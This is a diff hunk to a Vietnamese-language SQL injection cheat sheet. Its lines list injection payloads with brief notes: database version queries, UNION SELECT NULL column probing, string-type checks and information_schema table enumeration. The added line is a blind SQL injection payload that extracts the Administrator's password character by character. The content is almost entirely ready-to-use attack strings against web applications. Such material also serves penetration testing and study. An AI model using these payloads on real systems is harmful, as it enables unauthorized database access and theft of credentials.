@@ -8,4 +8,5 @@ SELECT * FROM v$version : thu thập thông tin về database
 'UNION SELECT Null,Null-- : để kiểm tra cột bị lỗi. Các bác còn có thể dùng ' UNION ORDER BY 2--
 'UNION SELECT 'heacker',Null-- : để kiểm tra giá trị của databse có cho phép string hay ko.
 SELECT * FROM information_schema.tables : tìm bảng cnf sống thôi
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm : nếu kí tự đầu tiên của passwd lớn hơn m thì OK đây là dạng blind Sqli
 
